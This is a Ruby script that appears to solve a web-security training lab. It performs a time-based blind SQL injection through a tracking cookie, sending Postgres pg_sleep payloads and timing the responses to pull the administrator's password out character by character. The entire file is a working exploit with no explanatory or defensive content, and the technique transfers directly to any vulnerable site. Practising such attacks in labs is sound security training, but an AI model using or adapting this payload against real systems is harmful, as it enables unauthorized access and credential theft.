# frozen_string_literal: true

require 'uri'
require 'net/http'

TARGET = 'https://0a8700bc03a40e4ec18a6e2d005c001c.web-security-academy.net/'

uri = URI(TARGET)

def get_res(req:, uri: URI(TARGET))
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
    http.request(req)
  end
end

req = Net::HTTP::Get.new(uri)
res = get_res(req: req)
cookies = res['set-cookie'].split(';')

chars = ('a'..'z').to_a + ('0'..'9').to_a + ('A'..'Z').to_a
password = ''

i = 1
j = 0
while j < chars.length
  c = chars[j]
  j += 1
  # Postgres case
  payload = "dne'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,#{i},1)='#{c}') THEN " \
  'pg_sleep(15) ELSE pg_sleep(0) END FROM users)--'

  cookies[0] = "TrackingId=#{payload}"
  req['Cookie'] = cookies.join(';')

  start = Time.now
  get_res(req: req)
  finish = Time.now
  elapsed = finish - start
  puts "Testing password: #{password + c}\tTook: #{elapsed}"

  next unless elapsed > 15

  password += c
  j = 0
  i += 1
end

puts "Password: #{password}"
